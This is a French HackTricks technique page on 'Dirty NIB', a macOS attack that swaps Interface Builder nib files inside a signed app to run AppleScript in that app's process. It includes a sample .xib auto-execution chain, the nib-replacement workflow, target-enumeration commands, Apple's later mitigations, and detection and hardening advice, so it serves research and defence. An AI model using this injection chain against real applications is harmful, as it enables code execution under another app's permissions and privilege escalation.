# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB désigne l’abus de fichiers Interface Builder (.xib/.nib) à l’intérieur du bundle d’une application macOS signée afin d’exécuter une logique contrôlée par l’attaquant dans le processus cible, héritant ainsi de ses entitlements et de ses permissions TCC. Cette technique a été documentée à l’origine par xpn (MDSec), puis généralisée et considérablement étendue par Sector7, qui a également couvert les mitigations d’Apple dans macOS 13 Ventura et macOS 14 Sonoma.<sup>[1][2]</sup> Pour le contexte et des analyses approfondies, consultez les références à la fin.

> TL;DR
> • Avant macOS 13 Ventura : remplacer le MainMenu.nib d’un bundle (ou un autre nib chargé au démarrage) permettait de manière fiable d’effectuer une injection de processus et souvent une privilege escalation.
> • Depuis macOS 13 (Ventura), avec des améliorations dans macOS 14 (Sonoma) : la vérification approfondie au premier lancement, la protection des bundles, les Launch Constraints et la nouvelle permission TCC « App Management » empêchent en grande partie la modification des nibs après le lancement par des applications non liées. Les attaques peuvent toutefois rester réalisables dans certains cas particuliers (par exemple, des outils du même développeur modifiant leurs propres applications, ou des terminaux auxquels l’utilisateur a accordé App Management/Full Disk Access).


## Que sont les fichiers NIB/XIB

Les fichiers Nib (abréviation de NeXT Interface Builder) sont des graphes d’objets UI sérialisés utilisés par les applications AppKit. Xcode moderne stocke les fichiers .xib modifiables au format XML, lesquels sont compilés en .nib lors du build. Une application typique charge son interface principale via `NSApplicationMain()`, qui lit la clé `NSMainNibFile` du fichier Info.plist de l’application et instancie le graphe d’objets au runtime.

Points clés permettant l’attaque :
- Le chargement d’un NIB instancie des classes Objective-C arbitraires sans exiger qu’elles soient conformes à NSSecureCoding (le chargeur de nib d’Apple utilise `init`/`initWithFrame:` comme solution de repli lorsque `initWithCoder:` n’est pas disponible).
- Cocoa Bindings peut être abusé pour appeler des méthodes lors de l’instanciation des nibs, notamment des appels chaînés ne nécessitant aucune interaction utilisateur.


## Processus d’injection Dirty NIB (vue de l’attaquant)

Le flux classique avant Ventura :
1) Créer un .xib malveillant
- Ajouter un objet `NSAppleScript` (ou d’autres classes « gadget » telles que `NSTask`).
- Ajouter un `NSTextField` dont le titre contient le payload (par exemple, un AppleScript ou des arguments de commande).
- Ajouter un ou plusieurs objets `NSMenuItem` reliés via des bindings pour appeler des méthodes sur l’objet cible.

2) Déclencher automatiquement sans clic de l’utilisateur
- Utiliser des bindings pour définir la target/selector d’un menu item, puis invoquer la méthode privée `_corePerformAction` afin que l’action soit exécutée automatiquement lors du chargement du nib. Cela évite qu’un utilisateur ait à cliquer sur un bouton.

Exemple minimal d’une chaîne de déclenchement automatique dans un .xib (abrégé pour plus de clarté) :
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Cela permet l’exécution d’AppleScript arbitraire dans le processus cible lors du chargement du nib.<sup>[1]</sup> Les chaînes avancées peuvent :
- Instancier des classes AppKit arbitraires (par ex. `NSTask`) et appeler des méthodes sans argument comme `-launch`.
- Appeler des selectors arbitraires avec des arguments objet via l’astuce de binding ci-dessus.
- Charger AppleScriptObjC.framework pour faire le bridge vers Objective-C et même appeler certaines APIs C.
- Sur les anciens systèmes qui incluent encore Python.framework, faire le bridge vers Python, puis utiliser `ctypes` pour appeler des fonctions C arbitraires (recherches de Sector7).<sup>[2]</sup>

3) Remplacer le nib de l’application
- Copier target.app vers un emplacement accessible en écriture, remplacer par exemple `Contents/Resources/MainMenu.nib` par le nib malveillant, puis exécuter target.app. Avant Ventura, après une évaluation initiale de Gatekeeper, les lancements suivants n’effectuaient que des vérifications superficielles de signature ; les ressources non exécutables (comme les fichiers .nib) n’étaient donc pas revalidées.

Exemple de payload AppleScript pour un test visible :
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protections modernes de macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple a introduit plusieurs mesures d’atténuation systémiques qui réduisent considérablement la viabilité de Dirty NIB sur les versions modernes de macOS :<sup>[2]</sup>
- Vérification approfondie au premier lancement et protection du bundle (macOS 13 Ventura)
- Lors de la première exécution d’une app (qu’elle soit mise en quarantaine ou non), une vérification approfondie de la signature couvre toutes les ressources du bundle. Ensuite, le bundle devient protégé : seules les apps du même développeur (ou explicitement autorisées par l’app) peuvent modifier son contenu. Les autres apps nécessitent la nouvelle permission TCC « App Management » pour écrire dans le bundle d’une autre app.
- Launch Constraints (macOS 13 Ventura)
- Les apps système/fournies par Apple ne peuvent pas être copiées ailleurs puis lancées ; cela neutralise l’approche « copy to /tmp, patch, run » pour les apps du système d’exploitation.
- Améliorations de macOS 14 Sonoma
- Apple a renforcé App Management et corrigé des bypass connus (par ex. CVE‑2023‑40450) signalés par Sector7. Python.framework avait été supprimé auparavant (macOS 12.3), ce qui a cassé certaines chaînes d’escalade de privilèges.
- Modifications de Gatekeeper/Quarantine
- Pour une discussion plus large de Gatekeeper, de la provenance et des changements d’évaluation ayant affecté cette technique, consultez la page référencée ci-dessous.

> Implication pratique
> • Sur Ventura+, vous ne pouvez généralement pas modifier le fichier .nib d’une app tierce, sauf si votre processus dispose de la permission App Management ou est signé avec le même Team ID que la cible (par ex. des outils de développement).
> • Accorder les permissions App Management ou Full Disk Access aux shells/terminaux rouvre effectivement cette surface d’attaque pour tout ce qui peut exécuter du code dans le contexte de ce terminal.


### Prise en compte de Launch Constraints

Launch Constraints empêchent l’exécution de nombreuses apps Apple depuis des emplacements non par défaut à partir de Ventura. Si vous dépendiez de workflows antérieurs à Ventura, comme copier une app Apple dans un répertoire temporaire, modifier `MainMenu.nib` et la lancer, attendez-vous à un échec sur les versions >= 13.0.


## Énumération des cibles et des nibs (utile pour la recherche / les systèmes legacy)

- Localiser les apps dont l’interface utilisateur est pilotée par des nibs :
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Trouver les ressources nib candidates dans un bundle :
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valider en profondeur les signatures de code (échouera si vous avez altéré les ressources sans re-signer) :
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Remarque : Sur les versions modernes de macOS, vous serez également bloqué par la protection des bundles/TCC lorsque vous tenterez d’écrire dans le bundle d’une autre application sans autorisation appropriée.


## Conseils de détection et de DFIR

- Surveillance de l’intégrité des fichiers des ressources des bundles
- Surveillez les modifications de mtime/ctime concernant `Contents/Resources/*.nib` et les autres ressources non exécutables des applications installées.
- Unified logs et comportement des processus
- Surveillez l’exécution inattendue d’AppleScript au sein des applications GUI, ainsi que les processus chargeant AppleScriptObjC ou Python.framework. Exemple :
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Évaluations proactives
- Exécutez périodiquement `codesign --verify --deep` sur les applications critiques afin de vous assurer que les ressources restent intactes.
- Contexte des privilèges
- Auditez les utilisateurs et les processus disposant de l’autorisation TCC « App Management » ou de Full Disk Access (en particulier les terminaux et les agents de gestion). Supprimer ces autorisations des shells à usage général empêche de réactiver trivialement une falsification de type Dirty NIB.


## Renforcement défensif (développeurs et défenseurs)

- Préférez une interface utilisateur programmatique ou limitez ce qui est instancié depuis les nibs. Évitez d’inclure des classes puissantes (par exemple, `NSTask`) dans les graphes de nibs et évitez les bindings qui invoquent indirectement des selectors sur des objets arbitraires.
- Adoptez le hardened runtime avec Library Validation (déjà standard dans les applications modernes). Bien que cela n’empêche pas à lui seul l’injection de nib, il bloque le chargement facile de code natif et force les attaquants à utiliser des payloads uniquement basés sur le scripting.
- Ne demandez pas d’autorisations App Management étendues dans les outils à usage général et n’en dépendez pas. Si un MDM nécessite App Management, séparez ce contexte des shells contrôlés par l’utilisateur.
- Vérifiez régulièrement l’intégrité du bundle de votre application et faites en sorte que vos mécanismes de mise à jour réparent automatiquement les ressources du bundle.


## Lectures connexes dans HackTricks

Apprenez-en davantage sur Gatekeeper, la quarantine et les modifications de provenance qui affectent cette technique :

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Références

- [1] [xpn – DirtyNIB (write-up original avec un exemple concernant Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 avril 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
